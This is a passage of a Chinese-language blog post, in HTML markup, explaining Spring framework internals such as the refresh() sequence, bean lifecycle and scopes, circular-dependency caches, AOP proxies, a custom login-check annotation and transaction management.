都加载、注册完成了，但是都还没有初始化，具体的子类可以在这步的时候添加一些特殊的 BeanFactoryPostProcessor 的实现类，来完成一些其他的操作。</span></span><br><span class=\"line\">            postProcessBeanFactory(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 6. 接下来是这个方法是调用 BeanFactoryPostProcessor 各个实现类的 postProcessBeanFactory(factory) 方法；</span></span><br><span class=\"line\">            invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 7. 然后这个方法注册 BeanPostProcessor 的实现类，和上面的BeanFactoryPostProcessor 是有区别的，这个方法调用的其实是PostProcessorRegistrationDelegate类的registerBeanPostProcessors方法；</span></span><br><span class=\"line\">            <span class=\"comment\">// 这个类里面有个内部类BeanPostProcessorChecker，BeanPostProcessorChecker里面有两个方法postProcessBeforeInitialization和postProcessAfterInitialization，这两个方法分别在 Bean 初始化之前和初始化之后得到执行。</span></span><br><span class=\"line\">            <span class=\"comment\">// 然后回到refresh()方法中继续往下看</span></span><br><span class=\"line\">            registerBeanPostProcessors(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 8. 方法是初始化当前 ApplicationContext 的 MessageSource，国际化处理，继续往下</span></span><br><span class=\"line\">            initMessageSource();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 9. 方法初始化当前 ApplicationContext 的事件广播器继续往下</span></span><br><span class=\"line\">            initApplicationEventMulticaster();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 10. 方法初始化一些特殊的 Bean（在初始化 singleton beans 之前）；继续往下</span></span><br><span class=\"line\">            onRefresh();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 11. 方法注册事件监听器，监听器需要实现 ApplicationListener 接口；继续往下</span></span><br><span class=\"line\">            registerListeners();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 12. 重点到了 初始化所有的 singleton beans（单例bean），懒加载（non-lazy-init）的除外，这个方法也是等会细说</span></span><br><span class=\"line\">            finishBeanFactoryInitialization(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 13. 方法是最后一步，广播事件，ApplicationContext 初始化完成</span></span><br><span class=\"line\">            finishRefresh();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(BeansException ex)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(logger.isWarnEnabled())&#123;</span><br><span class=\"line\">                logger.warn(<span class=\"string\">&quot;Exception encountered during context initialization - &quot;</span>+<span class=\"string\">&quot;cancelling refresh attempt: &quot;</span>+ex);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class=\"line\">            <span class=\"comment\">// 销毁已经初始化的 singleton 的 Beans，以免有些 bean 会一直占用资源</span></span><br><span class=\"line\">            destroyBeans();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// Reset &#x27;active&#x27; flag.</span></span><br><span class=\"line\">            cancelRefresh(ex);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// Propagate exception to caller.</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> ex;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// Reset common introspection caches in Spring&#x27;s core, since we</span></span><br><span class=\"line\">            <span class=\"comment\">// might not ever need metadata for singleton beans anymore...</span></span><br><span class=\"line\">            resetCommonCaches();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Spring-bean的生命周期\"><a href=\"#Spring-bean的生命周期\" class=\"headerlink\" title=\"Spring bean的生命周期\"></a>Spring bean的生命周期</h3><p>Spring Bean的生命周期分为四个阶段和多个扩展点。扩展点又可以分为影响多个Bean和影响单个Bean。整理如下：</p>\n<p>四个阶段</p>\n<ul>\n<li>实例化 Instantiation</li>\n<li>属性赋值 Populate</li>\n<li>初始化 Initialization</li>\n<li>销毁 Destruction</li>\n</ul>\n<p>多个扩展点</p>\n<ul>\n<li>影响多个Bean<ul>\n<li>BeanPostProcessor(作用于初始化阶段的前后)</li>\n<li>InstantiationAwareBeanPostProcessor(作用于实例化阶段的前后)</li>\n</ul>\n</li>\n<li>影响单个Bean<ul>\n<li>Aware(Aware类型的接口的作用就是让我们能够拿到Spring容器中的一些资源)<ul>\n<li>Aware Group1<ul>\n<li>BeanNameAware</li>\n<li>BeanClassLoaderAware</li>\n<li>BeanFactoryAware</li>\n</ul>\n</li>\n<li>Aware Group2<ul>\n<li>EnvironmentAware</li>\n<li>EmbeddedValueResolverAware(实现该接口能够获取Spring EL解析器，用户的自定义注解需要支持spel表达式的时候可以使用)</li>\n<li>ApplicationContextAware(ResourceLoaderAware\\ApplicationEventPublisherAware\\MessageSourceAware)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>生命周期(实例化和属性赋值都是Spring帮助我们做的，能够自己实现的有初始化和销毁两个生命周期阶段)<ul>\n<li>InitializingBean</li>\n<li>DisposableBean</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"bean的作用域\"><a href=\"#bean的作用域\" class=\"headerlink\" title=\"bean的作用域\"></a>bean的作用域</h3><p>Spring Bean 中所说的作用域，在配置文件中即是“scope”</p>\n<p>在面向对象程序设计中作用域一般指对象或变量之间的可见范围。</p>\n<p>而在Spring容器中是指其创建的Bean对象相对于其他Bean对象的请求可见范围。</p>\n<p>在Spring 容器当中，一共提供了5种作用域类型，在配置文件中，通过属性scope来设置bean的作用域范围</p>\n<h4 id=\"singleton\"><a href=\"#singleton\" class=\"headerlink\" title=\"singleton\"></a>singleton</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot;singleton&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>当Bean的作用域为singleton的时候,Spring容器中只会存在一个共享的Bean实例，所有对Bean的请求只要id与bean的定义相匹配，则只会返回bean的同一实例。单一实例会被存储在单例缓存中，为Spring的缺省作用域。</p>\n<h4 id=\"prototype\"><a href=\"#prototype\" class=\"headerlink\" title=\"prototype\"></a>prototype</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot; prototype &quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>每次对该Bean请求的时候，Spring IoC都会创建一个新的作用域。</p>\n<p>对于有状态的Bean应该使用prototype，对于无状态的Bean则使用singleton</p>\n<h4 id=\"request\"><a href=\"#request\" class=\"headerlink\" title=\"request\"></a>request</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot; request &quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>Request作用域针对的是每次的Http请求，Spring容器会根据相关的Bean的</p>\n<p>定义来创建一个全新的Bean实例。而且该Bean只在当前request内是有效的。</p>\n<h4 id=\"session\"><a href=\"#session\" class=\"headerlink\" title=\"session\"></a>session</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot; session &quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>针对http session起作用，Spring容器会根据该Bean的定义来创建一个全新的Bean的实例。而且该Bean只在当前http session内是有效的。</p>\n<h4 id=\"global-session\"><a href=\"#global-session\" class=\"headerlink\" title=\"global session\"></a>global session</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot;globalSession&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>类似标准的http session作用域，不过仅仅在基于portlet的web应用当中才有意义。Portlet规范定义了全局的Session的概念。他被所有构成某个portlet外部应用中的各种不同的portlet所共享。在global<br>session作用域中所定义的bean被限定于全局的portlet session的生命周期范围之内。</p>\n<h3 id=\"循环依赖问题\"><a href=\"#循环依赖问题\" class=\"headerlink\" title=\"循环依赖问题\"></a>循环依赖问题</h3><h4 id=\"三级缓存\"><a href=\"#三级缓存\" class=\"headerlink\" title=\"三级缓存\"></a>三级缓存</h4><p>Spring 解决循环依赖的核心就是提前暴露对象，而提前暴露的对象就是放置于第二级缓存中。下表是三级缓存的说明：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>singletonObjects</td>\n<td>一级缓存，存放完整的 Bean。</td>\n</tr>\n<tr>\n<td>earlySingletonObjects</td>\n<td>二级缓存，存放提前暴露的Bean，Bean 是不完整的，未完成属性注入和执行 init 方法。</td>\n</tr>\n<tr>\n<td>singletonFactories</td>\n<td>三级缓存，存放的是 Bean 工厂，主要是生产 Bean，存放到二级缓存中。</td>\n</tr>\n</tbody></table>\n<p>所有被Spring 管理的 Bean，最终都会存放在 singletonObjects 中，这里面存放的 Bean 是经历了所有生命周期的（除了销毁的生命周期），完整的，可以给用户使用的。</p>\n<p>earlySingletonObjects 存放的是已经被实例化，但是还没有注入属性和执行 init 方法的 Bean。</p>\n<p>singletonFactories 存放的是生产 Bean 的工厂。</p>\n<p>Bean 都已经实例化了，为什么还需要一个生产 Bean 的工厂呢？这里实际上是跟 AOP 有关，如果项目中不需要为 Bean 进行代理，那么这个 Bean 工厂就会直接返回一开始实例化的对象，如果需要使用 AOP 进行代理，那么这个工厂就会发挥重要的作用了，这也是本文需要重点关注的问题之一。</p>\n<h4 id=\"解决循环依赖\"><a href=\"#解决循环依赖\" class=\"headerlink\" title=\"解决循环依赖\"></a>解决循环依赖</h4><p>Spring 是如何通过上面介绍的三级缓存来解决循环依赖的呢？这里只用 A，B 形成的循环依赖来举例：</p>\n<ol>\n<li>实例化 A，此时 A 还未完成属性填充和初始化方法（@PostConstruct）的执行，A 只是一个半成品。</li>\n<li>为 A 创建一个 Bean 工厂，并放入到  singletonFactories 中。</li>\n<li>发现 A 需要注入 B 对象，但是一级、二级、三级缓存均为发现对象 B。</li>\n<li>实例化 B，此时 B 还未完成属性填充和初始化方法（@PostConstruct）的执行，B 只是一个半成品。</li>\n<li>为 B 创建一个 Bean 工厂，并放入到  singletonFactories 中。</li>\n<li>发现 B 需要注入 A 对象，此时在一级、二级未发现对象 A，但是在三级缓存中发现了对象 A，从三级缓存中得到对象 A，并将对象 A 放入二级缓存中，同时删除三级缓存中的对象 A。（注意，此时的 A 还是一个半成品，并没有完成属性填充和执行初始化方法）</li>\n<li>将对象 A 注入到对象 B 中。</li>\n<li>对象 B 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 B。（此时对象 B 已经是一个成品）</li>\n<li>对象 A 得到对象 B，将对象 B 注入到对象 A 中。（对象 A 得到的是一个完整的对象 B）</li>\n<li>对象 A 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 A。</li>\n</ol>\n<h2 id=\"Spring框架中的单例bean是否线程安全\"><a href=\"#Spring框架中的单例bean是否线程安全\" class=\"headerlink\" title=\"Spring框架中的单例bean是否线程安全\"></a>Spring框架中的单例bean是否线程安全</h2><p>Spring框架中的单例bean是线程安全的吗？它是如何处理线程并发问题的?</p>\n<p>不是，Spring框架中的单例bean不是线程安全的。</p>\n<p>spring 中的 bean 默认是单例模式，spring 框架并没有对单例 bean 进行多线程的封装处理。实际上大部分 spring bean 是无状态的（比如 dao 类），在某种程度上来说 bean 也是安全的，但如果 bean<br>有状态的话（比如 view model ）就要开发者自己去保证线程安全了，最简单的就是改变 bean 的作用域，把“singleton”变更为“prototype”，这样请求 bean 相当于 new Bean()了， 保证线程安全了。</p>\n<ul>\n<li>有状态就是有数据存储功能。</li>\n<li>无状态就是不会保存数据。</li>\n</ul>\n<p>Spring如何处理线程并发问题?</p>\n<p>一般只有无状态的Bean才可以在多线程下共享，大部分是无状态的Bean。当存有状态的Bean的时候，spring一般是使用ThreadLocal进行处理，解决线程安全问题。</p>\n<p>ThreadLocal和线程同步机制都是为了解决多线程中相同变量的访问冲突问题。 同步机制采用了“时间换空间”的方式，仅提供一份变量，不同的线程获取锁，没获得锁的线程则需要排队。而ThreadLocal采用了“空间换时间”的方式。<br>ThreadLocal会为每一个线程提供一个独立的变量副本，从而隔离了多个线程对数据的访问冲突。因为每一个线程都拥有自己的变量副本，所以没有相同变量的访问冲突问题。所以在编写多线程代码时，可以把不安全的变量封装进ThreadLocal。</p>\n<h2 id=\"AOP\"><a href=\"#AOP\" class=\"headerlink\" title=\"AOP\"></a>AOP</h2><p>OOP(Object-Oriented Programming)面向对象编程，允许开发者定义纵向的关系，但并适用于定义横向的关系，导致了大量代码的重复，而不利于各个模块的重用。</p>\n<p>AOP(Aspect-Oriented Programming)<br>，一般称为面向切面编程，作为面向对象的一种补充，用于将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模块，这个模块被命名为“切面”（Aspect），减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。可用于权限认证、日志、事务处理等。</p>\n<h3 id=\"AOP原理\"><a href=\"#AOP原理\" class=\"headerlink\" title=\"AOP原理\"></a>AOP原理</h3><p>原理是在IOC过程中，创建bean实例时，最后都会对bean进行处理来实现增强，对于AOP来说就是创建代理类</p>\n<ul>\n<li>底层是动态代理技术<ul>\n<li>JDK动态代理(基于接口)</li>\n<li>CGLib动态代理(基于类)</li>\n<li>在Spring AOP中，如果使用的是单例，推荐使用CGLib代理</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"JDK动态代理\"><a href=\"#JDK动态代理\" class=\"headerlink\" title=\"JDK动态代理\"></a>JDK动态代理</h3><p>(一）实现原理</p>\n<p>JDK的动态代理是基于反射实现。JDK通过反射，生成一个代理类，这个代理类实现了原来那个类的全部接口，并对接口中定义的所有方法进行了代理。当我们通过代理对象执行原来那个类的方法时，代理类底层会通过反射机制，回调我们实现的InvocationHandler接口的invoke方法。并且这个代理类是Proxy类的子类（记住这个结论，后面测试要用）。这就是JDK动态代理大致的实现方式。</p>\n<p>（二）优点</p>\n<p>JDK动态代理是JDK原生的，不需要任何依赖即可使用；</p>\n<p>通过反射机制生成代理类的速度要比CGLib操作字节码生成代理类的速度更快；</p>\n<p>（三）缺点</p>\n<p>如果要使用JDK动态代理，被代理的类必须实现了接口，否则无法代理；</p>\n<p>JDK动态代理无法为没有在接口中定义的方法实现代理，假设我们有一个实现了接口的类，我们为它的一个不属于接口中的方法配置了切面，Spring仍然会使用JDK的动态代理，但是由于配置了切面的方法不属于接口，为这个方法配置的切面将不会被织入。</p>\n<p>JDK动态代理执行代理方法时，需要通过反射机制进行回调，此时方法执行的效率比较低；</p>\n<h3 id=\"CGLib动态代理\"><a href=\"#CGLib动态代理\" class=\"headerlink\" title=\"CGLib动态代理\"></a>CGLib动态代理</h3><p>（一）实现原理</p>\n<p>CGLib实现动态代理的原理是，底层采用了ASM字节码生成框架，直接对需要代理的类的字节码进行操作，生成这个类的一个子类，并重写了类的所有可以重写的方法，在重写的过程中，将我们定义的额外的逻辑（简单理解为Spring中的切面）织入到方法中，对方法进行了增强。而通过字节码操作生成的代理类，和我们自己编写并编译后的类没有太大区别。</p>\n<p>（二）优点</p>\n<p>使用CGLib代理的类，不需要实现接口，因为CGLib生成的代理类是直接继承自需要被代理的类；</p>\n<p>CGLib生成的代理类是原来那个类的子类，这就意味着这个代理类可以为原来那个类中，所有能够被子类重写的方法进行代理；</p>\n<p>CGLib生成的代理类，和我们自己编写并编译的类没有太大区别，对方法的调用和直接调用普通类的方式一致，所以CGLib执行代理方法的效率要高于JDK的动态代理；</p>\n<p>（三）缺点</p>\n<p>由于CGLib的代理类使用的是继承，这也就意味着如果需要被代理的类是一个final类，则无法使用CGLib代理；</p>\n<p>由于CGLib实现代理方法的方式是重写父类的方法，所以无法对final方法，或者private方法进行代理，因为子类无法重写这些方法；</p>\n<p>CGLib生成代理类的方式是通过操作字节码，这种方式生成代理类的速度要比JDK通过反射生成代理类的速度更慢；</p>\n<h3 id=\"AOP术语\"><a href=\"#AOP术语\" class=\"headerlink\" title=\"AOP术语\"></a>AOP术语</h3><h4 id=\"连接点-Join-point\"><a href=\"#连接点-Join-point\" class=\"headerlink\" title=\"连接点(Join point)\"></a>连接点(Join point)</h4><p>能够被拦截的地方</p>\n<h4 id=\"切点-Poincut\"><a href=\"#切点-Poincut\" class=\"headerlink\" title=\"切点(Poincut)\"></a>切点(Poincut)</h4><p>具体定位的连接点</p>\n<h4 id=\"增强-通知-Advice\"><a href=\"#增强-通知-Advice\" class=\"headerlink\" title=\"增强&#x2F;通知(Advice)\"></a>增强&#x2F;通知(Advice)</h4><p>表示添加到切点的一段逻辑代码，并定位连接点的方位信息</p>\n<h4 id=\"织入-Weaving\"><a href=\"#织入-Weaving\" class=\"headerlink\" title=\"织入(Weaving)\"></a>织入(Weaving)</h4><p>将增强&#x2F;通知添加到目标类的具体连接点上的过程。</p>\n<h4 id=\"引入-引介-Introduction\"><a href=\"#引入-引介-Introduction\" class=\"headerlink\" title=\"引入&#x2F;引介(Introduction)\"></a>引入&#x2F;引介(Introduction)</h4><p>允许我们向现有的类添加新方法或属性。是一种特殊的增强！</p>\n<h4 id=\"切面-Aspect\"><a href=\"#切面-Aspect\" class=\"headerlink\" title=\"切面(Aspect)\"></a>切面(Aspect)</h4><p>切面由切点和增强&#x2F;通知组成，它既包括了横切逻辑的定义、也包括了连接点的定义</p>\n<h3 id=\"Spring对AOP的支持\"><a href=\"#Spring对AOP的支持\" class=\"headerlink\" title=\"Spring对AOP的支持\"></a>Spring对AOP的支持</h3><ul>\n<li>基于代理的经典SpringAOP：需要实现接口，手动创建代理</li>\n<li>纯POJO切面：使用XML配置，aop命名空间</li>\n<li>@AspectJ注解驱动的切面：使用注解的方式，这是最简洁和最方便的！</li>\n</ul>\n<h2 id=\"怎么定义一个注解\"><a href=\"#怎么定义一个注解\" class=\"headerlink\" title=\"怎么定义一个注解\"></a>怎么定义一个注解</h2><h3 id=\"引入依赖\"><a href=\"#引入依赖\" class=\"headerlink\" title=\"引入依赖\"></a>引入依赖</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-aop<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"定义注解\"><a href=\"#定义注解\" class=\"headerlink\" title=\"定义注解\"></a>定义注解</h3><h4 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h4><p>java.lang.annotation 提供了四种元注解，专门注解其他的注解（在自定义注解的时候，需要使用到元注解）：</p>\n<ul>\n<li>@Documented – 注解是否将包含在JavaDoc中</li>\n<li>@Retention – 什么时候使用该注解</li>\n<li>@Target – 注解用于什么地方</li>\n<li>@Inherited – 是否允许子类继承该注解</li>\n</ul>\n<h5 id=\"Retention\"><a href=\"#Retention\" class=\"headerlink\" title=\"@Retention\"></a>@Retention</h5><p>定义该注解的生命周期</p>\n<ul>\n<li>RetentionPolicy.SOURCE : 在编译阶段丢弃。这些注解在编译结束之后就不再有任何意义，所以它们不会写入字节码。@Override, @SuppressWarnings都属于这类注解。</li>\n<li>RetentionPolicy.CLASS : 在类加载的时候丢弃。在字节码文件的处理中有用。注解默认使用这种方式</li>\n<li>RetentionPolicy.RUNTIME : 始终不会丢弃，运行期也保留该注解，因此可以使用反射机制读取该注解的信息。我们自定义的注解通常使用这种方式。</li>\n</ul>\n<h5 id=\"Target\"><a href=\"#Target\" class=\"headerlink\" title=\"@Target\"></a>@Target</h5><p>表示该注解用于什么地方。默认值为任何元素，表示该注解用于什么地方。可用的ElementType 参数包括</p>\n<ul>\n<li>ElementType.CONSTRUCTOR: 用于描述构造器</li>\n<li>ElementType.FIELD: 成员变量、对象、属性（包括enum实例）</li>\n<li>ElementType.LOCAL_VARIABLE: 用于描述局部变量</li>\n<li>ElementType.METHOD: 用于描述方法</li>\n<li>ElementType.PACKAGE: 用于描述包</li>\n<li>ElementType.PARAMETER: 用于描述参数</li>\n<li>ElementType.TYPE: 用于描述类、接口(包括注解类型) 或enum声明</li>\n</ul>\n<h5 id=\"Documented\"><a href=\"#Documented\" class=\"headerlink\" title=\"@Documented\"></a>@Documented</h5><p>一个简单的Annotations 标记注解，表示是否将注解信息添加在java文档中。</p>\n<h5 id=\"Inherited\"><a href=\"#Inherited\" class=\"headerlink\" title=\"@Inherited\"></a>@Inherited</h5><p>定义该注释和子类的关系</p>\n<p>@Inherited 元注解是一个标记注解，@Inherited 阐述了某个被标注的类型是被继承的。如果一个使用了@Inherited 修饰的annotation 类型被用于一个class，则这个annotation 将被用于该class<br>的子类。</p>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>自定义一个检查是否登录的注解</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"meta\">@Documented</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> CheckLogin &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Aspect</span></span><br><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"meta\">@Slf4j</span></span><br><span class=\"line\"><span class=\"meta\">@Order(1)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CheckLoginAspect</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Before(&quot;execution(* *..controller..*(..))&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">before</span><span class=\"params\">(JoinPoint joinPoint)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">MethodSignature</span> <span class=\"variable\">signature</span> <span class=\"operator\">=</span> (MethodSignature) joinPoint.getSignature();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> signature.getMethod();</span><br><span class=\"line\">        <span class=\"type\">CheckLogin</span> <span class=\"variable\">annotation</span> <span class=\"operator\">=</span> method.getAnnotation(CheckLogin.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (annotation == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取类上注解</span></span><br><span class=\"line\">            annotation = joinPoint.getTarget().getClass().getAnnotation(CheckLogin.class);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (annotation != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取到请求的属性</span></span><br><span class=\"line\">            <span class=\"type\">ServletRequestAttributes</span> <span class=\"variable\">attributes</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                    (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class=\"line\">            <span class=\"comment\">//获取到请求对象</span></span><br><span class=\"line\">            <span class=\"type\">HttpServletRequest</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> attributes.getRequest();</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">ssoToken</span> <span class=\"operator\">=</span> HttpUtil.getSsoToken(request);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ssoToken != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">loginUserTokenKey</span> <span class=\"operator\">=</span> AuthRedisKeyUtil.getLoginUserTokenKey(ssoToken);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (redisTemplate.hasKey(loginUserTokenKey)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//通过</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LoginException</span>(<span class=\"string\">&quot;登录已过期&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalRequestException</span>(<span class=\"string\">&quot;非法请求&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AccountController</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@CheckLogin</span></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/query&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> JSONObject <span class=\"title function_\">queryRegulation</span><span class=\"params\">(Integer pageNum, Integer pageSize)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//....业务逻辑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h2><h3 id=\"Spring-支持两种方式的事务管理\"><a href=\"#Spring-支持两种方式的事务管理\" class=\"headerlink\" title=\"Spring 支持两种方式的事务管理\"></a>Spring 支持两种方式的事务管理</h3><h4 id=\"1、编程式事务管理\"><a href=\"#1、编程式事务管理\" class=\"headerlink\" title=\"1、编程式事务管理\"></a>1、编程式事务管理</h4><ul>\n<li>TransactionTemplate</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> TransactionTemplate transactionTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testTransaction</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    transactionTemplate.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">TransactionCallbackWithoutResult</span>()&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doInTransactionWithoutResult</span><span class=\"params\">(TransactionStatus status)</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//...业务代码</span></span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">                    status.setRollbackOnly();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span 